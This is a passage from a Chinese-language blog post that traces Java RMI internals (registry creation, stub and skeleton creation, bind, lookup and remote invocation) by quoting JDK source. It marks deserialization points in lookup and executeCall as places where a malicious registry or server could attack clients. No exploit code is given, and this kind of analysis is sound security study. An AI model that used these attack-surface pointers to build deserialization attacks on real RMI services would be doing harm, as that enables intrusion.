createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Util#stubClassExists</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>createStub函数中也非常简单，将我们所找到的类先初始化，再实例化出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RemoteStub <span class="title function_">createStub</span><span class="params">(Class&lt;?&gt; remoteClass, RemoteRef ref)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stubname</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Make sure to use the local stub loader for the stub classes.</span></span><br><span class="line"><span class="comment">         * When loaded by the local loader the load path can be</span></span><br><span class="line"><span class="comment">         * propagated to remote clients, by the MarshalOutputStream/InStream</span></span><br><span class="line"><span class="comment">         * pickle methods</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; stubcl =</span><br><span class="line">                Class.forName(stubname, <span class="literal">false</span>, remoteClass.getClassLoader());</span><br><span class="line">            Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line">            <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; ref &#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class not found: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class missing constructor: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Can&#x27;t create instance of stub class: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class constructor not public: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Exception creating instance of stub class: &quot;</span> + stubname, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Stub class not instance of RemoteStub: &quot;</span> + stubname, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>创建完成之后的Stub是一个<code>RegistryImpl_Stub</code>，其中封装着<code>UnicastRef</code>，<code>UnicastRef</code>封装着LiveR&#96;&#96;ef</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735573834459-17635906-08a3-40a4-b049-fd4806e3742b.png"></p>
<p>由于我们的Stub是<code>RegistryImpl_Stub</code>，是JDK中自带的Stub，而它是继承于RemoteStub的，所以会进入到if当中，执行setSkeleton方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RegistryImpl_Stub</span> <span class="keyword">extends</span> <span class="title class_">RemoteStub</span> <span class="keyword">implements</span> <span class="title class_">Registry</span>, Remote </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            setSkeleton(impl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>setSkeleton</code>方法中，会创建一个<code>Sekleton</code>，服务端和客户端都会有代理来处理网络请求，客户端代理为<code>Stub</code>，而服务端代理则为<code>Sekleton</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote impl)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutSkeletons.containsKey(impl.getClass())) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                skel = Util.createSkeleton(impl);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SkeletonNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Ignore exception for skeleton class not found, because a</span></span><br><span class="line"><span class="comment">                 * skeleton class is not necessary with the 1.2 stub protocol.</span></span><br><span class="line"><span class="comment">                 * Remember that this impl&#x27;s class does not have a skeleton</span></span><br><span class="line"><span class="comment">                 * class so we don&#x27;t waste time searching for it again.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                withoutSkeletons.put(impl.getClass(), <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后也是直接通过	远程类的名字+ “_Skel”	初始化并且实例化这个类并返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote object)</span></span><br><span class="line">        <span class="keyword">throws</span> SkeletonNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cl;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cl = getRemoteClass(object.getClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">                object.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// now try to load the skeleton based ont he name of the class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">skelname</span> <span class="operator">=</span> cl.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; skelcl = Class.forName(skelname, <span class="literal">false</span>, cl.getClassLoader());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (Skeleton)skelcl.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton class not found: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Can&#x27;t create skeleton: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;No public constructor: &quot;</span> +</span><br><span class="line">                                                skelname, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;Skeleton not of correct class: &quot;</span> + skelname, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后也是，创建一个<code>Target</code>，去吧有用的东西都存入进去，并把我们封装的东西发布出去（使用exportObject函数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">ref.exportObject(target);</span><br></pre></td></tr></table></figure>

<p>最后在<code>TCPTransport</code>中的<code>exportObject</code>方法中调用其父类的<code>exportObject</code>，使用<code>putTarget</code>方法，将所封装的<code>Target</code>放入静态表中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">        &#125; ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Transport#exportObject</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line">        ObjectTable.putTarget(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectTable#putTarget</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        ...</span><br><span class="line">                objTable.put(oe, target);</span><br><span class="line">                implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在静态表中，一共有三个Stub，其中一个是<code>DGCImpl_Stub</code>（分布式垃圾回收，默认创建），可以在表中点着看看，实际上其实和远程服务是一个东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735576170364-92848339-1eb4-43ce-898f-acf8476f2b15.png"></p>
<p>这就是创建注册中心的流程</p>
<h4 id="ce9N3">绑定</h4>
相比于其他的，这个绑定流程就非常简单了

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br></pre></td></tr></table></figure>

<p>进入到bind方法中</p>
<p>其中checkAccess方法是检查是否在本地绑定</p>
<p>bindings是一个静态表，bindings.get是从静态表中寻找name的，如果说表中存在该name的绑定，则会抛出一个AlreadyBoundException的异常，如果没有的话，就会将（name，远程对象）put进去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">    &#123;</span><br><span class="line">        checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">            <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">            bindings.put(name, obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><strong>tips:在RMI的实现上，要求注册中心和服务端在同一台主机上，低版本时实现上允许远程绑定，导致一些漏洞</strong></p>
<h4 id="yaynX">客户端请求注册中心-客户端</h4>
客户端会做两件事情，第一个就是向注册中心去拿远程对象的代理，第二个对服务端进行一个调用

<p>有人会觉得，我获取一个远程对象，肯定要有序列化和反序列化，但实际却不太一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>实际，我们将ip和端口传入，他首先是封装了一个<code>LiveRef</code>，然后调用<code>Util.createProxy</code>方法</p>
<p>和我们之前看到的创建流程好像一样，其实是在本地创建了一个，我们就有了注册中心的stub对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LocateRegistry#getRegistry</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> getRegistry(host, port, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// LocateRegistry#getRegistry</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                       RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">            port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in</span></span><br><span class="line">            <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">            <span class="comment">// that the RegistryImpl&#x27;s checkAccess will not fail.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// If that failed, at least try &quot;&quot; (localhost) anyway...</span></span><br><span class="line">                host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下一步就是去查找远程对象，客户端将名字给过去，获取到一个远程对象的代理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们进入lookup方法看一下，首先它将我们传入的那个名字（字符串），写入了一个输出流，就是序列化进去了，后续肯定还有一个反序列化的点</p>
<p>后面还有一个读输入流的地方，将输入流读出来的进行反序列化，赋值到var23上，我们可以知道，这个var23就是我们从注册中心获取回来的stub</p>
<p>其中对<strong>从注册中心读到的输入流</strong>进行<strong>反序列化</strong>的这个地方，可能就存在攻击点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var23;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var23 = (Remote)var6.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var20;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var21;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>super.ref.invoke(var2);</code>调用了<code>UnicastRef</code>的<code>invoke</code>方法，它调用了<code>executeCall</code>方法，这个方法是用来处理网络请求的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line"></span><br><span class="line">            call.executeCall();</span><br><span class="line"></span><br><span class="line">        &#125; ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里还存在一个攻击点，就在<code>StreamRemoteCall</code>的<code>executeCall</code>方法中</p>
<p>如果返回异常，且异常为<code>TransportConstants.ExceptionalReturn</code>，就会将这个异常反序列化出来，如果说注册中心返回一个恶意的流，就会导致客户端被攻击</p>
<p>这里的攻击面是非常广的，只要调用了<code>StreamRemoteCall#executeCall</code>或者说<code>UnicastRef#invoke</code>，就会有攻击面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read return value</span></span><br><span class="line">        <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">        <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">            Object ex;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ex = in.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// An exception should have been received,</span></span><br><span class="line">            <span class="comment">// if so throw it, else flag error</span></span><br><span class="line">            <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">                exceptionReceivedFromServer((Exception) ex);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Exception is thrown before fallthrough can occur</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;return code invalid: &quot;</span> + returnType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="fJ2jX">客户端请求服务端-客户端</h4>
我们来看一下客户端请求服务端，客户端是怎么做的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;SheepSean&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>第一步，我们会走到一个非预期的地方，因为remoteObj是一个动态远程代理，调用它的任何方法，都会跳到<code>invoke</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后它走到了<code>invokeRemoteMethod</code>中，在其中，我们要看一下<code>ref.invoke</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                     Method method,</span></span><br><span class="line"><span class="params">                                     Object[] args)</span></span><br><span class="line">       <span class="keyword">throws</span> Exception</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                   <span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                             getMethodHash(method));</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           ......</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>UnicastRef#invoke</code>中，仍然调用了<code>call.executeCall()</code>，我们知道，只要与网络请求有关的就会调用它，这里会有一个攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                         Method method,</span></span><br><span class="line"><span class="params">                         Object[] params,</span></span><br><span class="line"><span class="params">                         <span class="type">long</span> opnum)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;method: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            logClientCall(obj, method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">reuse</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the call connection is &quot;reused&quot; early, remember not to</span></span><br><span class="line"><span class="comment">         * reuse again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">alreadyFreed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, <span class="string">&quot;opnum = &quot;</span> + opnum);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create call context</span></span><br><span class="line">            call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// marshal parameters</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">                marshalCustomCallData(out);</span><br><span class="line">                Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                    